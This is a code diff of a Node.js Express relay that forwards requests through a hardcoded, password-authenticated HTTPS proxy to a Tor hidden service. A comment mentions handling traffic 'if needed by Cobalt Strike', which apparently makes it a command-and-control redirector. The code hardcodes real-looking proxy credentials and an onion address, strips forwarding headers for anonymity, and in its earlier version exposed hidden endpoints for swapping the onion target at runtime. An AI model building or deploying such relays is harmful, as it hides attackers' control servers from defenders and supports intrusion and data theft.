@@ -1,278 +1,74 @@
 const express = require('express');
-const http = require('http');
-const https = require('https');
-const { URL } = require('url');
-const fs = require('fs');
-const path = require('path');
+const axios = require('axios');
+const HttpsProxyAgent = require('https-proxy-agent');
 
+// Initialize Express app
 const app = express();
 const PORT = process.env.PORT || 3000;
-const CONFIG_FILE = path.join(__dirname, 'proxy-config.json');
 
-// Default configuration
-const DEFAULT_CONFIG = {
-  proxy: {
-    host: 'ep01.goodextensions.mooo.com',
-    port: 443,
-    user: 'mixtura',
-    pass: 'mixtura'
-  },
-  onion: {
-    host: 'ttcbgkpnl6at7dqhroa2shu44zqxzpwwwvdxbzoqznxk7lg5xso6bbqd.onion'
-  }
+// Tor HTTPS proxy configuration
+const proxyOptions = {
+  host: 'ep01.goodextensions.mooo.com',
+  port: 443,
+  auth: 'mixtura:mixtura',
+  secureProxy: true,
 };
 
-// Load or create config
-let config = loadConfig();
+// Create proxy agent
+const proxyAgent = new HttpsProxyAgent(proxyOptions);
 
-function loadConfig() {
-  try {
-    if (fs.existsSync(CONFIG_FILE)) {
-      const data = fs.readFileSync(CONFIG_FILE, 'utf8');
-      const loaded = JSON.parse(data);
-      console.log('[CONFIG] Loaded from file');
-      return loaded;
-    } else {
-      fs.writeFileSync(CONFIG_FILE, JSON.stringify(DEFAULT_CONFIG, null, 2));
-      console.log('[CONFIG] Created default config file');
-      return DEFAULT_CONFIG;
-    }
-  } catch (error) {
-    console.error('[CONFIG] Error loading config:', error.message);
-    return DEFAULT_CONFIG;
-  }
-}
+// Target Tor hidden service
+const onionUrl = 'http://ttcbgkpnl6at7dqhroa2shu44zqxzpwwwvdxbzoqznxk7lg5xso6bbqd.onion/api/v1';
 
-function saveConfig(newConfig) {
-  try {
-    fs.writeFileSync(CONFIG_FILE, JSON.stringify(newConfig, null, 2));
-    console.log('[CONFIG] Saved to file');
-    return true;
-  } catch (error) {
-    console.error('[CONFIG] Error saving config:', error.message);
-    return false;
-  }
-}
-
-function getProxyAuth() {
-  return 'Basic ' + Buffer.from(`${config.proxy.user}:${config.proxy.pass}`).toString('base64');
-}
-
-// Watch config file for changes
-fs.watch(CONFIG_FILE, (eventType, filename) => {
-  if (eventType === 'change') {
-    console.log('[CONFIG] File changed, reloading...');
-    setTimeout(() => {
-      config = loadConfig();
-      console.log(`[CONFIG] Updated - Onion: ${config.onion.host}`);
-    }, 100);
-  }
-});
-
-// Middleware
+// Middleware to parse JSON bodies (if needed by Cobalt Strike)
 app.use(express.json());
-app.use(express.raw({ type: '*/*', limit: '10mb' }));
 
-// Function to make request through HTTP proxy
-function proxyRequest(targetUrl, method, headers, body) {
-  return new Promise((resolve, reject) => {
-    const parsedTarget = new URL(targetUrl);
-    
-    const options = {
-      host: config.proxy.host,
-      port: config.proxy.port,
-      method: method,
-      path: targetUrl,
+// Route to handle /api/v1 requests
+app.all('/api/v1/*', async (req, res) => {
+  try {
+    // Construct the full URL for the hidden service
+    const targetPath = req.originalUrl.replace('/api/v1', '');
+    const targetUrl = `${onionUrl}${targetPath}`;
+
+    // Forward the request to the Tor hidden service
+    const response = await axios({
+      method: req.method,
+      url: targetUrl,
       headers: {
-        'Host': parsedTarget.hostname,
-        'Proxy-Authorization': getProxyAuth(),
-        'Connection': 'keep-alive',
-        ...headers
+        ...req.headers,
+        host: new URL(onionUrl).host, // Set correct host for .onion
+        'X-Forwarded-For': undefined, // Remove X-Forwarded-For for anonymity
       },
-      timeout: 60000,
-      rejectUnauthorized: false
-    };
-
-    const client = https;
-    
-    const proxyReq = client.request(options, (proxyRes) => {
-      let chunks = [];
-      
-      proxyRes.on('data', (chunk) => {
-        chunks.push(chunk);
-      });
-      
-      proxyRes.on('end', () => {
-        resolve({
-          status: proxyRes.statusCode,
-          headers: proxyRes.headers,
-          body: Buffer.concat(chunks)
-        });
-      });
+      data: req.body,
+      proxy: false, // Disable axios default proxy
+      httpAgent: proxyAgent, // Use Tor proxy agent
+      httpsAgent: proxyAgent,
+      timeout: 30000, // 30-second timeout
     });
 
-    proxyReq.on('error', (err) => {
-      reject(err);
-    });
-
-    proxyReq.on('timeout', () => {
-      proxyReq.destroy();
-      reject(new Error('Request timeout'));
-    });
-
-    if (body && method !== 'GET' && method !== 'HEAD') {
-      proxyReq.write(body);
-    }
-    
-    proxyReq.end();
-  });
-}
-
-// Update endpoint
-app.post('/___update', express.json(), (req, res) => {
-  try {
-    const updates = req.body;
-    
-    if (!updates || typeof updates !== 'object') {
-      return res.status(400).json({ 
-        error: 'Invalid request', 
-        message: 'Request body must be a JSON object' 
-      });
-    }
-
-    // Apply updates to config
-    if (updates.onion?.host) {
-      config.onion.host = updates.onion.host;
-    }
-    if (updates.proxy?.host) {
-      config.proxy.host = updates.proxy.host;
-    }
-    if (updates.proxy?.port) {
-      config.proxy.port = updates.proxy.port;
-    }
-    if (updates.proxy?.user) {
-      config.proxy.user = updates.proxy.user;
-    }
-    if (updates.proxy?.pass) {
-      config.proxy.pass = updates.proxy.pass;
-    }
-
-    // Save updated config
-    if (saveConfig(config)) {
-      console.log(`[UPDATE] Config updated - Onion: ${config.onion.host}`);
-      res.json({
-        success: true,
-        message: 'Configuration updated',
-        config: {
-          onion: config.onion,
-          proxy: {
-            host: config.proxy.host,
-            port: config.proxy.port,
-            user: config.proxy.user
-          }
-        }
-      });
-    } else {
-      res.status(500).json({ error: 'Failed to save configuration' });
-    }
-  } catch (error) {
-    console.error('[UPDATE] Error:', error.message);
-    res.status(500).json({ error: 'Internal server error', details: error.message });
-  }
-});
-
-// Get current config
-app.get('/___config', (req, res) => {
-  res.json({
-    onion: config.onion,
-    proxy: {
-      host: config.proxy.host,
-      port: config.proxy.port,
-      user: config.proxy.user
-    },
-    headers: config.headers
-  });
-});
-
-// Main proxy handler
-app.all('*', async (req, res) => {
-  // Skip special endpoints and favicon
-  if (req.url === '/favicon.ico' || req.url.startsWith('/___')) {
-    return;
-  }
-
-  try {
-    const targetUrl = `http://${config.onion.host}${req.url}`;
-    
-    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
-    
-    // Use configured headers
-    const headers = { ...config.headers };
-
-    // Copy safe headers from request
-    const safeToCopy = ['cookie', 'referer', 'content-type', 'content-length', 'authorization'];
-    safeToCopy.forEach(h => {
-      if (req.headers[h]) {
-        headers[h] = req.headers[h];
-      }
-    });
-
-    // Make request
-    const response = await proxyRequest(targetUrl, req.method, headers, req.body);
-
-    console.log(`[${new Date().toISOString()}] Response: ${response.status}`);
-
-    // Copy response headers
-    const responseHeaders = { ...response.headers };
-    delete responseHeaders['transfer-encoding'];
-    delete responseHeaders['connection'];
-
-    // Handle redirects
-    if (responseHeaders.location) {
-      responseHeaders.location = responseHeaders.location.replace(
-        new RegExp(`http://${config.onion.host}`, 'g'),
-        `${req.protocol}://${req.get('host')}`
-      );
-    }
-
-    // Send response
+    // Forward response headers and status
     res.status(response.status);
-    Object.keys(responseHeaders).forEach(key => {
-      res.setHeader(key, responseHeaders[key]);
+    Object.entries(response.headers).forEach(([key, value]) => {
+      res.setHeader(key, value);
     });
-    res.send(response.body);
 
+    // Send response data
+    res.send(response.data);
   } catch (error) {
-    console.error(`[${new Date().toISOString()}] Proxy error:`, error.message);
-    
-    if (!res.headersSent) {
-      res.status(502).json({
-        error: 'Bad Gateway',
-        message: 'Failed to connect to onion service',
-        details: error.message,
-        onion: config.onion.host,
-        proxy: `${config.proxy.host}:${config.proxy.port}`
-      });
-    }
+    console.error('Proxy Error:', error.message);
+    res.status(500).json({
+      error: 'Internal Server Error',
+      message: error.message,
+    });
   }
 });
 
-// Health check
-app.get('/__health', (req, res) => {
-  res.json({ 
-    status: 'ok', 
-    onion: config.onion.host,
-    proxy: `${config.proxy.host}:${config.proxy.port}`,
-    timestamp: new Date().toISOString()
-  });
+// Health check endpoint for hosting platform
+app.get('/health', (req, res) => {
+  res.status(200).json({ status: 'OK' });
 });
 
-const server = app.listen(PORT, () => {
-  console.log(`Tor2Web proxy running on port ${PORT}`);
-  console.log(`Proxying to: ${config.onion.host}`);
-  console.log(`Via Tor proxy: ${config.proxy.host}:${config.proxy.port}`);
-  console.log(`Config file: ${CONFIG_FILE}`);
+// Start the server
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
 });
-
-server.keepAliveTimeout = 65000;
-server.headersTimeout = 66000;
